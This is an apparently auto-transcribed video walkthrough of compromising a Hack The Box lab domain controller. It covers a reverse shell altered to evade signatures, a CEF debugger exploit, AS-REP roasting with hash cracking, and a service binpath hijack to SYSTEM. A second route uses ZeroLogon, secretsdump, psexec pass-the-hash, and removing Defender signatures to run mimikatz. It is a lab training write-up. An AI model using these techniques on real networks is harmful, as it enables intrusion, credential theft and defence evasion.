blocked not our iex command so we can do vi shell.ps1 and i'm going to delete the help because that's not me in the program and sometimes signatures are created based upon that and the function is going to be please work go down here please work so we change up the reverse shell very very slightly got it and we get a reverse shell great so now we can probably move forward with this cef exploit i think so let's see we're probably going to want to do let's do something simple first in a ping so let's see um we want to run it cf.exe and his example he puts the url there i'm going to do url last so i'm going to do cef.exe dash code and we want to do ping ping 10 10 14 2 url this and you have to be relatively quick with it so i don't think it's going to work because the socket's probably closed but we'll find out so i'm just going to do it in this window actually tcp dump dash i ton 0 icmp sudo paste the cef command hey we got a bang so we are making progress the thing we have to do now though is get reverse shell and that's what we have here we can do powershell however we got a lot of quotes we're working with right now and the iex does use quotes which is going to get a little messy so what i'm going to do is we're going to go back here look at a powershell command we'll look at our iex command let's just copy this i'm gonna go here and just echo it out and it's using single quotes okay and then we can convert it to utf-16 little ndn because that's the windows format don't know why they chose that but whenever you do base64 from linux to windows you have to specify it is utf-16 little endian if you don't do that your powershell code uh your base64 is gonna be about half the distance or half the length so let's get rid of that i convert you can see the big difference and that's because we look at xxd here it's using two bytes for everything so four nine zero zero and little endian if this was big ndn format it would be zero zero four nine but least significant bit first and it goes like that so if we don't do that i convert you can see it's not doing any zero zeros but yeah so base64-w 0 we can copy this and before we do anything it's always always always always handy to test the code out before you put in an exploit so powershell dash enc and we get a shell do i have that cef command here still so now we can do powershell dash enc paste and all we want to do is grab up to the url so go back to our script and get rid of tcp dump build a new shell and we're going to do cf.exe and this is going to say which sockets uh are sockets for visual studio and i'm going to paste and then put the socket it should any minute now sometimes it takes a while to actually output there we go there were three servers that appear to be cef debuggers so let's go and paste and we get a shell so if we do who am i here we're cyork so we can go back into bloodhound and i probably should have um done a script command before this to log it and then rlwrap as well so let's do this again real quick um cd logs cyork script o r cyork dot log where's my x we'll just do r lrap nc lvmp 9001 uh we can try a different url i'm guessing it's not going to be listening still but you never know it is so got a shell who am i and since i have rlwrap i can do up and down so we can go back to bloodhound c-y-o-r-k at megacorp hit enter why are you not okay uh to get rid of this target nerd thing you click the highway and we're gonna mark this as owned and we're going to do queries shortest paths from owned principles wait well did not say the other one earn principles megacorp we have cyoric owned oh sure is path from owned merc is owned okay queries own principles owned megacorp cyork and i don't think we have anything so let's see two high-value targets oh god there's a lot of things here so let's see that's that seeing if we have our other user here doesn't look like we do so let's go back and one of our goals was to get into the inet pub directory and write a web shell to get a shell as is user so we have the sempersonate and this user has access we type web dot config is there anything good in here let's see echo test to t doesn't look like we can write echo test to web dot config so we don't have any write permissions in this directory there is a bin if we go inside of bin there is one dll that really sticks out multi-master api.dll let's grab this and i'm going to copy this into a windows directory and then we'll download it so download and then paste download successful so if we go into our logs directory we can look and see this is net so we could cop this over to a windows machine and decompile it but before we take all that effort i'm just going to run strings against it and we'll see if we have anything doesn't look like anything there and if you didn't know strings has multiple encoding options so dash e so i'm going to do l e l on that and we get a password so uid finder remember this is the um username the sql server was listening on or like when we did like db user whatever it was and then the password as development so let's go and do another crack map exec on dash u usernames dash p development smb 10 10 10 179 put this in quotes because that exclamation point's a special character and i don't know if bash will handle it i don't know what bash will do to it and we get s bower as a user um if i didn't get any users i'd probably do the like net user command slash domain and copy all these users to that username list but we have one as s power so let's log in as him and see what he has i guess before we do that we can actually just um look him in bloodhound mark him as owned uh mark has earned shorts pass from owned principles s power so that's nothing special us paths to high value targets and we have s bauer right here can i zoom in i can so s bauer has generic all over account operators which has right tackles over administrators if we right click and do help abuse info let's see we could potentially grant yourself the ad member privilege too the administrator group so we can potentially do that ps remote what else do we have we have generic right over jordan so there's two main things i guess we can do we can potentially um oh wait i think that's saying administrator has right tackle over account operators yeah so we have generic right to jordan and if we look at generic right uh directory access ability to write any non-predicted attribute on the target including members for a group service principal name etc so let's see what is this doing [Music] i think this may be setting his password i thought that would be protected anyways when i get this genetic rate over a user i generally enable curb roasting on that user which may be what it was saying but we can probably do it without these commands oh yeah so there it is so it's creating um a service principal name for that user which then exposes the password in active directory i think but that's essentially what we'll do so let's do evil winrm actually before we do that script s power dot log evil when rm dash i 10 10 10 179 dash u for user s power dash p i wonder if i had to do mega corp probably not we'll find out okay so we're all back on the box so let's see we want to get the jordan user and make him kerberostable so we'll do get ad user jordan maybe en okay now we're getting set 80 account control does not require pre-off to true and before you do that i'm going to run the impact command so let's do locate and packet grep example cd user shared dock python3 and packet examples and then we'll do get np users uh megacorp dash request i think see is that how domain slash ping mega corp sudo vi etsy host we can do may equip there and specified dot local i'm doing that right let's try running this now go again did it specify the username i don't think i do there we go i wonder if i do megacorp guest still gonna return anything okay so i guess i had to specify the user and if we wanted to prevent a do good opsec we turn it back to false and now when we do this request it's not set so we have a password we can crack again so let's go back into the kraken cd v hashes uh kob i guess i'm just gonna put so 23. let's do hash cat dash dash example hashes grep ap 23 scrap 23 let's see cat hashes kfb and i'm just going to search for this and we'll do dash b five and that's mode 18 200. so dot slash cat dash m 18 200 hashes kob up the word list rock u and let's see if we can crack this hash and looks like we did let's just do show and the password is rainforest 786 so let's see we can exit that ssh rainforest 786 v passwords just gonna put that there and we can now search for jordan uh get our queries let's see if i can spell en mark this person as owned and then shortest paths from own principles nothing here shorts past the high value targets see jordan is here it's a member of server operators privilege i.t accounts i don't know exactly what that one does but there's not much else we can do with this but it is a member of server operators so let's go on to this box blogs we can do script jordan.log evil winrm 10 10 10 179 u jordan p rainforest something cat passwords 786 okay let's try running win ps again so i'm going to go back into this directory where win ps is saved and we'll run it again and maybe this will tell us what that server operator account can do so dot slash win ps.exe and we're just going to let this run and look over the results now that win ps is finished we can go up and look through the results and we have generic right over a lot of these services so that service operator looks like it is giving us right access over all the services so let's see what's a service we want to edit um glancing through we can do uso svc because we've done that in previous videos so let's try dot slash sc.exe does that work it does so if you just do sc without exe powershell is going to translate it into i think set content or something so you have to specify.exe in powershell if this was a command prompt we wouldn't have to so config uso svc bin path is equal to let's do let's just try powershell enc and what is a command we go logs grab i enc do we have it hey we do see logging makes life so easy okay you can try this and we can control c out of this shell nc lvmp 9001 and we can do sc.exe uh stop uso svc and then we can start it cannot be started see i wonder if we can enable let's see google sc.exe enable service spy config enable equals something service name start equals dot l so c dot exe config uso svc start equals manual c invalid field sc.exe config service name auto okay start this did not respond in a timely fashion and we didn't get a shell so i'm guessing it's maybe the bin path so let's try um c colon windows system 32 cmd.exe c and then that powershell string start let's try stopping and then starting and we're not getting anything so maybe there's some like length limit on this let's see we can try pinging so ping 10 10 14 2 and then sudo tcp dump dash i ton zero icmp the bin path is set and that does work so it's probably some type of length or we copied it wrong so the very first thing i'm going to do is copy this powershell enc paste not properly encoded so sometimes logging helps other times it doesn't i guess when you don't properly copy something let's see what did i have that's what i did enc let's see do we have i convert in here so i think i just didn't copy the whole thing i think the logging because like it had binary data in it the log was bad because it stopped at this w and we keep going so let's delete all this and we'll paste it again we are listening start and we get a shell as system so that'll be the box uh we have another way to do the box an alternative route to do this box and it's going to go so much quicker than this whole thing i have no clue what the video length is right now but i am guessing it is pretty long so we're going to start the box from scratch and we're going to use the xero login to exploit it so let me just exit everything and we're gonna do zero login which is the exploit that came out like four days before this box retired that allows you to reset the machine password of a domain controller so sounds a lot of fun so full disclaimer i haven't actually done this exploit live yet so this would be the first time running through it so i'm going to explore a little bit afterwards however i am creating a snapshot of the vm just because um yeah it could go south very quickly so we're going to search for a cve 2020 1472 github which is the xero login cbe we're going to download it so get clone okay and let's see um i guess we can import and pack it as well so github and packet and this is going to be the main reason why i snapshot on my machine cdn packet get pull when's the last commit three days ago that's fine so let's see dot slash setup.pi python3 setup.pie install is that how we do it let's see was in packet requirements we're going to do pip 3 install and packet wonder what version this grabs i'll do the dangerous thing uh python3 setup.pi install okay dangerous always trumps uh non-dangerous i guess cd opt uh do we have the cbe here python3 okay dc name and dcip so this is going to be megacorp.local 101010179 see i'm gonna try multi master okay and it's gotta do like 256 authentication attempts uh impacted no attribute so impacted is not using the latest version let's see trying to think locate and pack it user share disk packages we probably should create a virtual environment for this uh this is why we create snapshots though because we don't feel like creating a virtual environment what times if we run this now i was hoping i just deleted the m packet that came with either pip or apt and now hopefully it defaults to the one i manually installed but i'm not positive if that's the case now that's not the case then we will use virtual m to install it come on and it still failed so um let's try doing it the correct way i'm going to restore my snapshot before i mucked around and we will try to create a virtual environment so let's go to cd opt unpack it get pull again and then we can do uh python 3 dash mvm and we have to give it the environment directory which i'm just going to call vm again and not create it successfully because ensure pip is not available apt install python3-vn sudo yep let's install this and these processing trigger for mandb always takes so long there we go create the environment then we can do source vm bin activate and we can just do pip install period so this should create a virtual and uh we don't have something maybe we need to install python 3 dev deactivate sudo apt install python3 dev c you don't have something to build i've encountered this one before um let's see if i just google invalid command b test wheel python see doesn't have something to build i thought it was the dash dev package but may not be three install wheel try this okay that worked i just saw they were asking for a wheel so that's why i installed that so now that we have this uh we may be able to run python3 up cbe oh i don't even have it here uh cve 2020 0 1 4 72 github see the dot get paul what oh get clone and then python 3 cve multi-master what the other argument was ip 10 10 10 179 so let's see if this works um it's going to take a little while so we're going to speed up the video yet again so the command finished and it says target vulnerable changing account password to empty string so now we should just be able to do a secret stump just dc no password multi-master and then backslash dollar for machine account at 10 10 10 179 and we log in and are able to extract all the hashes so at this point we could control c out of it and uh use this password hash the six nine whatever with ps exec administrator at 10 10 10 179 uh probably dash hashes is it there we go and in like five minutes maybe we have completed the machine from start to finish just based upon the zero login exploit so it's pretty much like eternal blue to domain controllers um the downside right now is we left a glaring vulnerability um there's no password on the dc's machine account so that's not good um let's see can we specify the account we want let's see so we have target svc nas is this only going to target ip let's see at svc nas i'm trying to get it just to dump one account right now this is the part that i haven't done before so not exactly sure how to do it in this if i just use mimikats i know how to do it and that may be what we end up doing um just dc user let's see and packet secrets don't specify user does he have ntds dumping tables i'm probably just going to upload mimikats multi-master because i don't know how to specify the username exec method no just dc user doesn't sound like it i'm going to add the history flag let that run and we're going to grab the mini cats so mini cats github let's see so release i think that's trunk see okay we actually got the history so 31d6 this is the empty hash and here's the last password the machine was set at and that's the ntlm hash so i don't know how to set the password as ntlm um let's see password reset director ntlm it's probably that reset.pi in this thing so if we go restore password dot pi let's see dash hashes lm ntlm okay so let's do it this way um multi-master and we're going to go like this python 3 restore password dot pi and how do they say to do it okay multi master domain slash box and then box so let's do megacorp multimaster dot local at multi-master dash hashes like that and we probably want dash target dash ip dash target ip 10 10 10 179 and let's see argument should be bytes buffer what i wonder if he did something special with this so let's do dash hex pass real quick see if this works access to died well we may have done something good see do we get access denied here no we do not so we have to do dash no dash pass do i forget a flag let's see python restore password okay let's get rid of that no pass maybe it doesn't want the dot local see target look at how to specify username 10 10 10 179 cat etsy post megacorp.local multimaster so everything is good there just doesn't want to restore so i think the answer is let's use mimikats real quick so let's see first let's ps exec so we can just go back as administrator and then we have memory cats and our downloads so cp downloads minicats chunk 7zx and then we can go into x64 moviecast.exe so i'm going to copy mimicats.exe to opt cve because that's where it was i think i can just upload minicats.exe upload memocats.exe okay so evo1rm cpx64 manycats.exe here and let's see i think i can just write to program data it's easier going into that system 32 minicats.exe come on no antivirus if defender is not running we'll be able to execute memicats and be happy cd backslash cd program data dot slash mimicats.exe exit the system cannot execute the specified program so it looks like there is defender on this box uh we can copy mimikatz to sql and backslash windows and defender has deleted it let's try removing all definitions so cd backslash program 1 i think and that'll probably be in cd windows defender we should have like an mpcmd something there it is so we can copy this and then dash remove definitions paul re-upload mini cats and let's see if this works so all we did was delete every signature and defender and since hack the box doesn't have internet access it can't go and download them again so this could help out okay come on slash mimicats.exe there we go so we have minicats so let's see dot slash mimi cats.exe lsa dump set ntlm slash user multi master dollar slash ntlm we gotta get that hash hex pass that's not it make this bigger let's see where is it that's what we want set it to be this okay uh shoot and we don't have exit oh sweet it did exit so probably should rl wrap something let's paste the hash down there we don't need this session any more so i can close it let's see the annoying thing about mimikatz and that is the default argument separator is space so probably have to put this in quotes like this then exit try that and it looks like it's set so hopefully when we run secret stump again probably did it in this session we have no pass on this and it fails that's good so let's see we can say see secret stump we don't actually have the administrator password i wonder if we can do dash hashes to log in uh ps exec log in this way we'll say multi-master or mega corp administrator see i know what i did my arguments are messed up this is the actual login right here so let's get rid of it and get rid of no pass and we can say multi-master administrator at 10 10 10 179. maybe two backslashes see try one backslash multi-master let's not specify a domain there we go so now it's dumping and i want to do history i think i got rid of history oh no i did not oh well we just wasted like 30 seconds of your time but this should show us that we have restored the password to be the same exact thing and i'm sure m packet has an option but honestly i don't use impact that much i normally use mini cats let's see multi-master history so we can see the password is here oddly enough i guess maybe when you have a blank password it doesn't store in the history i don't know what that password was maybe a failed attempt but yeah we have restored the password to be this one so that'll be the box hope you guys enjoyed it take care and i will see you all next week